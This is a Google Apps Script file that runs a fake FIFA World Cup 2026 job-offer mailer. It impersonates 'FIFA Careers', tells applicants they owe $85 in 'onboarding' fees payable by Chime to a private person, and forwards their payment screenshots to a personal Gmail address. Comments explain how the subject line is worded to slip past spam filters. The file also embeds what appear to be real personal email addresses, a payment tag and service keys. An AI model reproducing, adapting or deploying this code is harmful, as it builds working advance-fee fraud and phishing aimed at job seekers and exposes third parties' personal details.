/**
 * FIFA World Cup 2026 — Email 2 (offer + payment) after application.
 *
 * SCRIPT_VERSION: 2026-06-13-emailjs-deliverability
 *
 * ⚠️ REDEPLOY — read before saving:
 * 1. In Apps Script, select ALL code in Code.gs and DELETE it.
 * 2. Paste this ENTIRE file (do not merge with old code).
 * 3. Save → Deploy → Manage deployments → Edit → New version → Deploy.
 * 4. Time-driven trigger: sendDueFollowUpEmails → every hour.
 *
 * DOMAIN: payment links always use PAYMENT_PAGE_URL (fifa26workforce.com).
 * Stale Netlify URLs in the POST body are ignored.
 */

const SCRIPT_VERSION = "2026-06-13-emailjs-deliverability";

const FOLLOWUP_DELAY_MS = 5 * 60 * 1000; // testing: 5 min — production: 4 * 60 * 60 * 1000
const QUEUE_PREFIX = "followup_";
const PAYMENT_PAGE_URL = "https://fifa26workforce.com";
const COMPANY_LOGO_URL =
  "https://res.cloudinary.com/dhrjlmfcp/image/upload/v1781028763/email-assets/bt5l2gysvg0fjgfndgbw.png";
/** Inbox-aligned subject — avoid "offer" / "confirmed" in subject (spam triggers). */
const EMAIL_SUBJECT = "Next steps for your FIFA World Cup 2026 application";

const EMAILJS_REPLY_TO = "support@fifa26recruitment.com";
const EMAILJS_FROM_NAME = "FIFA Careers";

/** "emailjs" | "brevo" | "gmail". EmailJS needs EMAILJS_PRIVATE_KEY in Script properties. */
const EMAIL_SENDER = "emailjs";

const EMAILJS_PUBLIC_KEY = "F34PJBkDeDBtVEddl";
const EMAILJS_SERVICE_ID = "service_scveg1v";
const EMAILJS_APPROVAL_TEMPLATE_ID = "template_ww0808o";

const BREVO_SENDER_NAME = "FIFA Careers";
/** Must be a verified sender in Brevo (Settings → Senders, domains & IPs). */
const BREVO_SENDER_EMAIL = "support@fifa26recruitment.com";

const CHIME_PAYMENT_NAME = "Phillip Marks";
const CHIME_TAG = "$Phillip-Marks-11";
const CHIME_PAYMENT_EMAIL = "phillipmarks001@gmail.com";

/** Inbox for payment screenshot alerts. */
const PAYMENT_NOTIFICATION_EMAIL = "paulgoodling0@gmail.com";

const DEFAULT_PAYMENT_EXPLANATION =
  "These fees cover your onboarding, pre-employment screening, health assessment, and role training required to confirm your match-day placement at the FIFA World Cup 2026. The uniform deposit is fully refundable on return of your issued kit.";

function doGet() {
  return jsonResponse({
    ok: true,
    scriptVersion: SCRIPT_VERSION,
    paymentPageUrl: PAYMENT_PAGE_URL,
    emailSender: EMAIL_SENDER,
    emailDesign: "venue-check-in-pass",
    hint: "If scriptVersion is not 2026-06-13-emailjs-deliverability, paste full Apps Script.js and deploy new version.",
  });
}

function doPost(event) {
  if (!event || !event.postData || !event.postData.contents) {
    return jsonResponse({
      error: "doPost needs a POST body from the careers site. In the editor, run testSetup() instead.",
    });
  }

  const payload = JSON.parse(event.postData.contents || "{}");

  if (payload.type === "payment_submission") {
    return handlePaymentSubmission(payload);
  }

  const applicationId = String(payload.applicationId || "");

  if (!applicationId || !payload.email) {
    return jsonResponse({ error: "applicationId and email are required" });
  }

  const record = {
    name: String(payload.name || ""),
    email: String(payload.email || ""),
    role: String(payload.role || ""),
    applicationId,
    jobId: String(payload.jobId || ""),
    jobTitle: String(payload.jobTitle || ""),
    jobLocation: String(payload.jobLocation || ""),
    hostCity: String(payload.hostCity || ""),
    stadiumName: String(payload.stadiumName || ""),
    stadiumAddress: String(payload.stadiumAddress || ""),
    reportingDateLabel: String(payload.reportingDateLabel || ""),
    reportingTimeLabel: String(payload.reportingTimeLabel || ""),
    reportingInstruction: normalizeReportingInstruction(payload.reportingInstruction),
    reportingSource: String(payload.reportingSource || ""),
    fees: payload.fees || {},
    paymentExplanation: String(payload.paymentExplanation || ""),
    paymentUrl: resolvePaymentUrl(payload),
    approvedAtIso: String(payload.approvedAtIso || new Date().toISOString()),
    createdAt: new Date().toISOString(),
    sendAt: new Date(Date.now() + FOLLOWUP_DELAY_MS).toISOString(),
    sent: false,
  };

  PropertiesService.getScriptProperties().setProperty(
    QUEUE_PREFIX + applicationId,
    JSON.stringify(record),
  );

  return jsonResponse({
    ok: true,
    scriptVersion: SCRIPT_VERSION,
    applicationId,
    sendAt: record.sendAt,
    paymentUrl: record.paymentUrl,
  });
}

function handlePaymentSubmission(payload) {
  const applicationId = String(payload.applicationId || "").trim();
  const applicantEmail = String(payload.applicantEmail || "").trim();

  if (!applicationId || !applicantEmail) {
    return jsonResponse({ error: "applicationId and applicantEmail are required" });
  }

  const record = {
    applicationId,
    applicantName: String(payload.applicantName || ""),
    applicantEmail,
    transactionRef: String(payload.transactionRef || ""),
    role: String(payload.role || ""),
    amount: String(payload.amount || ""),
    paymentMethod: String(payload.paymentMethod || "Chime Pay Anyone"),
    confirmationRef: String(payload.confirmationRef || ""),
    screenshotUrl: String(payload.screenshotUrl || ""),
    timestamp: String(payload.timestamp || new Date().toISOString()),
  };

  sendPaymentNotificationEmail(record);

  return jsonResponse({
    ok: true,
    scriptVersion: SCRIPT_VERSION,
    type: "payment_submission",
    confirmationRef: record.confirmationRef,
    notificationSentTo: PAYMENT_NOTIFICATION_EMAIL,
  });
}

function sendPaymentNotificationEmail(record) {
  const subject = "Payment screenshot received — " + record.applicationId;

  GmailApp.sendEmail(PAYMENT_NOTIFICATION_EMAIL, subject, buildPaymentNotificationPlain(record), {
    htmlBody: buildPaymentNotificationHtml(record),
    name: "FIFA Payment Portal",
  });
}

function buildPaymentNotificationHtml(record) {
  const screenshotBlock = record.screenshotUrl
    ? '<div style="margin:20px 0;text-align:center;">' +
      '<p style="margin:0 0 10px;font-size:13px;font-weight:700;color:#051d39;">Payment screenshot</p>' +
      '<a href="' +
      escapeHtml(record.screenshotUrl) +
      '" style="display:block;">' +
      '<img src="' +
      escapeHtml(record.screenshotUrl) +
      '" alt="Payment screenshot" style="max-width:100%;height:auto;border:1px solid #e4e8f0;border-radius:8px;" />' +
      "</a>" +
      '<p style="margin:10px 0 0;font-size:12px;color:#505b73;">' +
      '<a href="' +
      escapeHtml(record.screenshotUrl) +
      '">Open full image</a></p></div>'
    : '<p style="margin:16px 0;font-size:14px;color:#92400e;">No screenshot URL was included in this submission.</p>';

  return (
    '<div style="font-family:Arial,sans-serif;background:#f4f4f4;padding:24px;">' +
    '<div style="max-width:560px;margin:0 auto;background:#ffffff;padding:28px;border-radius:8px;">' +
    '<h1 style="margin:0 0 8px;font-size:22px;color:#051d39;">New payment submission</h1>' +
    '<p style="margin:0 0 20px;font-size:14px;color:#505b73;">A candidate submitted payment details on the workforce payment page.</p>' +
    '<table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="border-collapse:collapse;font-size:14px;color:#1c2121;">' +
    rowHtml("Application ID", record.applicationId) +
    rowHtml("Name", record.applicantName) +
    rowHtml("Email", record.applicantEmail) +
    rowHtml("Role", record.role) +
    rowHtml("Amount", record.amount) +
    rowHtml("Payment method", record.paymentMethod) +
    rowHtml("Transaction ref", record.transactionRef || "—") +
    rowHtml("Confirmation ref", record.confirmationRef) +
    rowHtml("Submitted", record.timestamp) +
    "</table>" +
    screenshotBlock +
    "</div></div>"
  );
}

function rowHtml(label, value) {
  return (
    "<tr>" +
    '<td style="padding:8px 0;font-weight:700;color:#051d39;vertical-align:top;width:140px;">' +
    escapeHtml(label) +
    "</td>" +
    '<td style="padding:8px 0;color:#1c2121;">' +
    escapeHtml(value) +
    "</td></tr>"
  );
}

function buildPaymentNotificationPlain(record) {
  return [
    "New payment submission",
    "",
    "Application ID: " + record.applicationId,
    "Name: " + record.applicantName,
    "Email: " + record.applicantEmail,
    "Role: " + record.role,
    "Amount: " + record.amount,
    "Payment method: " + record.paymentMethod,
    "Transaction ref: " + (record.transactionRef || "—"),
    "Confirmation ref: " + record.confirmationRef,
    "Submitted: " + record.timestamp,
    "",
    "Screenshot: " + (record.screenshotUrl || "not provided"),
  ].join("\n");
}

function sendDueFollowUpEmails() {
  const props = PropertiesService.getScriptProperties();
  const all = props.getProperties();
  const now = Date.now();

  Object.entries(all).forEach(([key, value]) => {
    if (!key.startsWith(QUEUE_PREFIX)) return;

    const record = JSON.parse(value);
    if (record.sent || Date.parse(record.sendAt) > now) return;

    record.paymentUrl = resolvePaymentUrl(record);
    sendFollowUpEmail(record);
    record.sent = true;
    props.setProperty(key, JSON.stringify(record));
  });
}

function sendFollowUpEmail(record) {
  if (EMAIL_SENDER === "brevo") {
    sendFollowUpEmailViaBrevo(record);
    return;
  }
  if (EMAIL_SENDER === "emailjs") {
    sendFollowUpEmailViaEmailJS(record);
    return;
  }
  sendFollowUpEmailViaGmail(record);
}

function sendFollowUpEmailViaBrevo(record) {
  const apiKey = PropertiesService.getScriptProperties().getProperty("BREVO_API_KEY") || "";

  if (!apiKey) {
    throw new Error(
      "BREVO_API_KEY is missing. Apps Script → Project Settings → Script properties → add BREVO_API_KEY.",
    );
  }

  const response = UrlFetchApp.fetch("https://api.brevo.com/v3/smtp/email", {
    method: "post",
    contentType: "application/json",
    headers: {
      "api-key": apiKey,
      accept: "application/json",
    },
    payload: JSON.stringify({
      sender: { name: BREVO_SENDER_NAME, email: BREVO_SENDER_EMAIL },
      to: [{ email: record.email, name: record.name || "" }],
      subject: EMAIL_SUBJECT,
      htmlContent: buildApprovalEmailHtml(record),
      textContent: plainTextFromRecord(record),
    }),
    muteHttpExceptions: true,
  });

  const status = response.getResponseCode();
  if (status !== 201) {
    throw new Error("Brevo send failed (" + status + "): " + response.getContentText());
  }
}

function sendFollowUpEmailViaGmail(record) {
  GmailApp.sendEmail(record.email, EMAIL_SUBJECT, plainTextFromRecord(record), {
    htmlBody: buildApprovalEmailHtml(record),
    name: "FIFA Careers",
  });
}

function sendFollowUpEmailViaEmailJS(record) {
  const privateKey =
    PropertiesService.getScriptProperties().getProperty("EMAILJS_PRIVATE_KEY") || "";

  if (!privateKey) {
    throw new Error(
      "EMAILJS_PRIVATE_KEY is missing. Add it in Apps Script → Project Settings → Script properties.",
    );
  }

  const fees = record.fees || {};
  const paymentUrl = resolvePaymentUrl(record);

  const response = UrlFetchApp.fetch("https://api.emailjs.com/api/v1.0/email/send", {
    method: "post",
    contentType: "application/json",
    payload: JSON.stringify({
      service_id: EMAILJS_SERVICE_ID,
      template_id: EMAILJS_APPROVAL_TEMPLATE_ID,
      user_id: EMAILJS_PUBLIC_KEY,
      accessToken: privateKey,
      template_params: {
        to_email: record.email,
        to_name: record.name,
        name: record.name,
        email: record.email,
        from_name: EMAILJS_FROM_NAME,
        reply_to: EMAILJS_REPLY_TO,
        email_subject: EMAIL_SUBJECT,
        subject: EMAIL_SUBJECT,
        job_title: record.jobTitle,
        application_id: record.applicationId,
        reporting_instruction: normalizeReportingInstruction(record.reportingInstruction),
        reporting_date: record.reportingDateLabel,
        reporting_time: record.reportingTimeLabel,
        stadium_name: record.stadiumName,
        stadium_address: record.stadiumAddress,
        fee_rows_html: buildFeeRowsHtml(fees),
        compulsory_total: fees.compulsoryTotalLabel || "",
        deposit_total: fees.depositTotalLabel || "",
        grand_total: fees.grandTotalLabel || "",
        payment_explanation: getPaymentExplanation(record),
        payment_url: paymentUrl,
        logo_url: COMPANY_LOGO_URL,
        message_html: buildApprovalEmailHtml(record),
        message_text: plainTextFromRecord(record),
      },
    }),
    muteHttpExceptions: true,
  });

  const status = response.getResponseCode();
  if (status < 200 || status >= 300) {
    throw new Error("EmailJS send failed (" + status + "): " + response.getContentText());
  }
}

/** Always rebuild from PAYMENT_PAGE_URL — ignores stale Netlify URLs in the queue. */
function resolvePaymentUrl(record) {
  return buildPaymentUrl(record);
}

function buildPaymentUrl(record) {
  const payload = {
    applicationId: record.applicationId,
    role: record.role,
    name: record.name,
    email: record.email,
    jobTitle: record.jobTitle,
    jobLocation: record.jobLocation,
    stadiumName: record.stadiumName,
    stadiumAddress: record.stadiumAddress,
    reportingDateLabel: record.reportingDateLabel,
    reportingTimeLabel: record.reportingTimeLabel,
    reportingInstruction: normalizeReportingInstruction(record.reportingInstruction),
    fees: record.fees || {},
    paymentExplanation: record.paymentExplanation || "",
  };

  const encoded = Utilities.base64Encode(JSON.stringify(payload));
  return PAYMENT_PAGE_URL.replace(/\/+$/, "") + "/?d=" + encodeURIComponent(encoded);
}

function getPaymentExplanation(record) {
  const text = String(record.paymentExplanation || "").trim();
  if (!text || /compulsory/i.test(text)) {
    return DEFAULT_PAYMENT_EXPLANATION;
  }
  return text;
}

function buildFeeRowsHtml(fees) {
  return ((fees && fees.items) || [])
    .map(function (item) {
      return (
        '<div style="display:flex;justify-content:space-between;gap:16px;padding:14px 16px;border-bottom:1px solid #e4e8f0;">' +
        "<div>" +
        '<p style="margin:0;font-size:15px;font-weight:700;color:#1c2121;">' +
        escapeHtml(item.label) +
        "</p>" +
        '<p style="margin:4px 0 0;font-size:13px;color:#505b73;">' +
        escapeHtml(item.description) +
        "</p>" +
        "</div>" +
        '<p style="margin:0;font-size:15px;font-weight:700;color:#1c2121;white-space:nowrap;">' +
        escapeHtml(item.amountLabel) +
        "</p>" +
        "</div>"
      );
    })
    .join("");
}

function buildVenueCheckInPassHtml(record) {
  const id = escapeHtml(record.applicationId || "");
  const name = escapeHtml(record.name || "");
  const role = escapeHtml(record.jobTitle || "");
  const date = escapeHtml(record.reportingDateLabel || "");
  const time = escapeHtml(record.reportingTimeLabel || "");
  const venue = escapeHtml(record.stadiumName || "");

  return (
    '<div style="margin:32px 0;border-radius:14px;overflow:hidden;border:3px solid #051d39;box-shadow:0 14px 36px rgba(5,29,57,0.28),0 0 0 1px rgba(212,175,55,0.45);max-width:100%;">' +
    '<div style="height:5px;background:repeating-linear-gradient(90deg,#d4af37 0,#d4af37 10px,#1277d9 10px,#1277d9 20px);"></div>' +
    '<div style="background:linear-gradient(145deg,#051d39 0%,#0c2f5e 45%,#051d39 100%);padding:20px 20px 18px;text-align:center;">' +
    '<p style="margin:0;font-size:9px;font-weight:700;letter-spacing:0.28em;color:#94a3b8;text-transform:uppercase;">Official workforce credential</p>' +
    '<p style="margin:5px 0 0;font-size:10px;font-weight:700;letter-spacing:0.22em;color:#d4af37;text-transform:uppercase;">FIFA World Cup 2026&trade;</p>' +
    '<p style="margin:8px 0 0;font-size:17px;font-weight:800;color:#ffffff;letter-spacing:0.12em;text-transform:uppercase;">Venue Check-In Pass</p>' +
    "</div>" +
    '<div style="height:6px;background:linear-gradient(90deg,#1277d9 0%,#00a651 20%,#d4af37 40%,#e31837 60%,#1277d9 80%,#00a651 100%);"></div>' +
    '<div style="background:linear-gradient(180deg,#f4f7fb 0%,#ffffff 35%,#ffffff 100%);padding:0;">' +
    '<table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="border-collapse:collapse;">' +
    "<tr>" +
    '<td style="width:8px;background:linear-gradient(180deg,#1277d9 0%,#051d39 100%);"></td>' +
    '<td style="padding:26px 22px 22px;text-align:center;">' +
    '<p style="margin:0 0 6px;font-size:10px;font-weight:800;letter-spacing:0.16em;text-transform:uppercase;color:#1277d9;">Present at stadium reception</p>' +
    '<p style="margin:0 0 2px;font-size:12px;color:#6b7280;">Assigned to</p>' +
    '<p style="margin:0 0 16px;font-size:19px;font-weight:800;color:#051d39;line-height:1.35;">' +
    name +
    "</p>" +
    '<p style="margin:0 0 6px;font-size:10px;font-weight:700;letter-spacing:0.14em;text-transform:uppercase;color:#6b7280;">Application ID</p>' +
    '<div style="margin:0 auto 16px;padding:18px 20px;background:linear-gradient(180deg,#ffffff 0%,#eef3f9 100%);border:3px solid #051d39;border-radius:10px;max-width:340px;box-shadow:0 6px 18px rgba(5,29,57,0.14),inset 0 0 0 2px #d4af37;">' +
    '<p style="margin:0;font-size:30px;font-weight:800;color:#051d39;font-family:Courier New,Courier,monospace;letter-spacing:0.1em;line-height:1.15;">' +
    id +
    "</p>" +
    "</div>" +
    '<p style="margin:0 0 18px;font-size:13px;color:#505b73;line-height:1.5;">' +
    role +
    "</p>" +
    '<div style="margin:0 auto 18px;max-width:320px;border-top:2px dashed #1277d9;padding-top:14px;opacity:0.55;">' +
    '<p style="margin:0;font-size:10px;font-weight:700;color:#94a3b8;letter-spacing:0.2em;line-height:1.8;">&#9632;&#9632;&#9632; &#9632;&#9632;&#9632; &#9632;&#9632;&#9632; &#9632;&#9632;&#9632; &#9632;&#9632;&#9632;</p>' +
    "</div>" +
    '<div style="margin:0 auto;max-width:360px;padding:16px 18px;background:linear-gradient(135deg,#fffbeb 0%,#fef3c7 100%);border:2px solid #d4af37;border-radius:10px;box-shadow:0 4px 16px rgba(212,175,55,0.28);">' +
    '<p style="margin:0;font-size:13px;font-weight:800;color:#92400e;text-transform:uppercase;letter-spacing:0.08em;">&#128247; Screenshot this entire card</p>' +
    '<p style="margin:10px 0 0;font-size:12px;color:#78350f;line-height:1.6;">Save it to your phone and show it at reception on your reporting date. Check-in may be delayed without it.</p>' +
    "</div>" +
    "</td>" +
    '<td style="width:8px;background:linear-gradient(180deg,#1277d9 0%,#051d39 100%);"></td>' +
    "</tr></table>" +
    "</div>" +
    '<div style="background:linear-gradient(180deg,#e8eef5 0%,#f0f4f8 100%);padding:16px 20px;border-top:3px solid #d4af37;">' +
    '<table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="border-collapse:collapse;">' +
    "<tr>" +
    '<td style="padding:4px 0;font-size:11px;font-weight:700;color:#051d39;text-transform:uppercase;letter-spacing:0.06em;width:72px;">Date</td>' +
    '<td style="padding:4px 0;font-size:12px;color:#505b73;">' +
    date +
    "</td>" +
    "</tr>" +
    "<tr>" +
    '<td style="padding:4px 0;font-size:11px;font-weight:700;color:#051d39;text-transform:uppercase;letter-spacing:0.06em;width:72px;">Time</td>' +
    '<td style="padding:4px 0;font-size:12px;color:#505b73;">' +
    time +
    "</td>" +
    "</tr>" +
    (venue
      ? "<tr><td style=\"padding:4px 0;font-size:11px;font-weight:700;color:#051d39;text-transform:uppercase;letter-spacing:0.06em;width:72px;\">Venue</td><td style=\"padding:4px 0;font-size:12px;color:#505b73;\">" +
        venue +
        "</td></tr>"
      : "") +
    "</table></div>" +
    '<div style="height:4px;background:repeating-linear-gradient(90deg,#d4af37 0,#d4af37 10px,#1277d9 10px,#1277d9 20px);"></div></div>'
  );
}

function buildApprovalEmailHtml(record) {
  const fees = record.fees || {};
  const paymentUrl = resolvePaymentUrl(record);
  const paymentExplanation = getPaymentExplanation(record);

  return (
    '<div style="background:#f4f4f4;padding:30px 0;font-family:Arial,sans-serif;">' +
    '<div style="text-align:center;margin-bottom:25px;">' +
    '<img src="' +
    COMPANY_LOGO_URL +
    '" width="120" alt="FIFA Careers" style="display:block;max-width:120px;margin:0 auto;border:0;">' +
    "</div>" +
    '<div style="background:#ffffff;max-width:640px;margin:auto;padding:42px 36px;">' +
    '<h1 style="text-align:center;font-size:32px;color:#051d39;margin:0 0 24px;">Next steps for your application</h1>' +
    '<p style="font-size:17px;line-height:1.7;color:#1c2121;">Hi ' +
    escapeHtml(record.name) +
    ",</p>" +
    '<p style="font-size:17px;line-height:1.7;color:#1c2121;">Thank you for applying for <strong>' +
    escapeHtml(record.jobTitle) +
    "</strong> at the FIFA World Cup 2026. Please review the details below and complete your onboarding fees to continue in the recruitment process.</p>" +
    buildVenueCheckInPassHtml(record) +
    '<h2 style="font-size:22px;color:#051d39;margin:28px 0 12px;">Reporting details</h2>' +
    '<p style="font-size:16px;line-height:1.7;color:#1c2121;">' +
    escapeHtml(normalizeReportingInstruction(record.reportingInstruction)) +
    "</p>" +
    '<p style="font-size:16px;line-height:1.7;color:#1c2121;">' +
    "<strong>Date:</strong> " +
    escapeHtml(record.reportingDateLabel) +
    "<br><strong>Time:</strong> " +
    escapeHtml(record.reportingTimeLabel) +
    "<br><strong>Venue:</strong> " +
    escapeHtml(record.stadiumName) +
    ", " +
    escapeHtml(record.stadiumAddress) +
    "</p>" +
    '<h2 style="font-size:22px;color:#051d39;margin:28px 0 12px;">Onboarding fees</h2>' +
    '<p style="font-size:16px;line-height:1.7;color:#1c2121;">' +
    escapeHtml(paymentExplanation) +
    "</p>" +
    '<div style="margin:18px 0;border:1px solid #e4e8f0;border-radius:8px;overflow:hidden;">' +
    buildFeeRowsHtml(fees) +
    "</div>" +
    '<p style="font-size:16px;line-height:1.7;color:#1c2121;">' +
    "<strong>Onboarding fees:</strong> " +
    escapeHtml(fees.compulsoryTotalLabel || "") +
    "<br><strong>Uniform deposit (refundable):</strong> " +
    escapeHtml(fees.depositTotalLabel || "") +
    "<br><strong>Amount due:</strong> " +
    escapeHtml(fees.grandTotalLabel || "") +
    "</p>" +
    '<div style="text-align:center;margin:34px 0;">' +
    '<a href="' +
    paymentUrl +
    '" style="display:inline-block;background:#1277d9;color:#ffffff;text-decoration:none;padding:16px 32px;border-radius:4px;font-size:17px;font-weight:700;">Complete my onboarding payment</a>' +
    "</div>" +
    '<p style="font-size:14px;color:#505b73;line-height:1.6;border-top:1px solid #e4e8f0;padding-top:20px;margin-top:20px;">If you have any questions about this application or the payment process, please reply to this email and a member of the recruitment team will be in touch.</p>' +
    "</div></div>"
  );
}

function plainTextFromRecord(record) {
  const fees = record.fees || {};
  const paymentUrl = resolvePaymentUrl(record);

  return [
    "Hi " + record.name + ",",
    "",
    "Thank you for applying for " + record.jobTitle + " at the FIFA World Cup 2026.",
    "",
    "VENUE CHECK-IN PASS — SCREENSHOT REQUIRED",
    "Application ID: " + record.applicationId,
    "Present a screenshot of your Venue Check-In Pass at stadium reception.",
    "",
    "REPORTING DETAILS",
    normalizeReportingInstruction(record.reportingInstruction),
    "Date: " + record.reportingDateLabel,
    "Time: " + record.reportingTimeLabel,
    "Venue: " + record.stadiumName + ", " + record.stadiumAddress,
    "",
    "ONBOARDING FEES",
    getPaymentExplanation(record),
    "Onboarding fees: " + (fees.compulsoryTotalLabel || ""),
    "Uniform deposit (refundable): " + (fees.depositTotalLabel || ""),
    "Amount due: " + (fees.grandTotalLabel || ""),
    "",
    "Complete your payment here (Chime instructions are on the payment page):",
    paymentUrl,
    "",
    "If you have any questions, reply to this email.",
  ].join("\n");
}

function normalizeReportingInstruction(text) {
  return String(text || "")
    .replace(/\s*\(shown below\)/gi, "")
    .replace(/\s*\(shown above\)/gi, "");
}

function escapeHtml(value) {
  return String(value || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function jsonResponse(body) {
  return ContentService.createTextOutput(JSON.stringify(body)).setMimeType(
    ContentService.MimeType.JSON,
  );
}

/** Run in Apps Script editor to verify deploy + queue a test email. */
function testSetup() {
  Logger.log("Script version: " + SCRIPT_VERSION);

  const testData = {
    postData: {
      contents: JSON.stringify({
        name: "Test Applicant",
        email: "oladeinderichard1@gmail.com",
        role: "catering_coordinator",
        applicationId: "APP-TEST-" + Date.now(),
        jobTitle: "Catering Coordinator, Match Day Only",
        jobLocation: "Atlanta, Georgia 30313",
        hostCity: "Atlanta",
        stadiumName: "Mercedes-Benz Stadium",
        stadiumAddress: "Atlanta, Georgia 30313",
        reportingDateLabel: "June 15, 2026",
        reportingTimeLabel: "7:00 AM",
        reportingInstruction:
          "Please report to the staff entrance on Gate C with your Venue Check-In Pass screenshot and a valid photo ID.",
        fees: {
          items: [
            {
              label: "Onboarding & registration fee",
              description:
                "Covers your staff ID, accreditation lanyard, credential pack, and contract administration.",
              amountLabel: "$20.00",
            },
            {
              label: "Pre-employment screening",
              description:
                "Background verification and security clearance required before credentialing.",
              amountLabel: "$20.00",
            },
            {
              label: "Health & fitness assessment",
              description:
                "Occupational health check required for event insurance and venue access approval.",
              amountLabel: "$15.00",
            },
            {
              label: "Role induction & training",
              description: "Venue familiarisation, match-day procedures, and safety briefing.",
              amountLabel: "$15.00",
            },
            {
              label: "Uniform & equipment deposit",
              description:
                "Refundable deposit for your issued uniform and equipment. Returned in full when kit is handed back.",
              amountLabel: "$15.00 deposit",
            },
          ],
          compulsoryTotalLabel: "$70.00",
          depositTotalLabel: "$15.00",
          grandTotalLabel: "$85.00",
        },
        paymentExplanation:
          "These fees cover your onboarding, screening, health assessment, and training for your FIFA World Cup 2026 placement.",
        paymentUrl: "https://imaginative-bonbon-f200da.netlify.app/?d=OLD_SHOULD_BE_IGNORED",
      }),
    },
  };

  const result = doPost(testData);
  const body = JSON.parse(result.getContent());
  Logger.log("doPost result: " + result.getContent());
  Logger.log("Payment URL must be fifa26workforce.com: " + body.paymentUrl);
  Logger.log("Test email queued — arrives after FOLLOWUP_DELAY_MS");
}

/** Run in Apps Script editor to test payment screenshot notification email. */
function testPaymentNotification() {
  Logger.log("Script version: " + SCRIPT_VERSION);

  const result = doPost({
    postData: {
      contents: JSON.stringify({
        type: "payment_submission",
        applicationId: "APP-TEST-PAY-" + Date.now(),
        applicantName: "Test Applicant",
        applicantEmail: "test@example.com",
        transactionRef: "CHIME-TEST-123",
        role: "Catering Coordinator",
        amount: "$85.00",
        paymentMethod: "Chime Pay Anyone",
        confirmationRef: "CONF-TEST-" + Date.now(),
        screenshotUrl:
          "https://res.cloudinary.com/dibwotfd5/image/upload/v1/samples/ecommerce/accessories-bag.jpg",
        timestamp: new Date().toISOString(),
      }),
    },
  });

  Logger.log("Payment notification result: " + result.getContent());
  Logger.log("Check inbox: " + PAYMENT_NOTIFICATION_EMAIL);
}
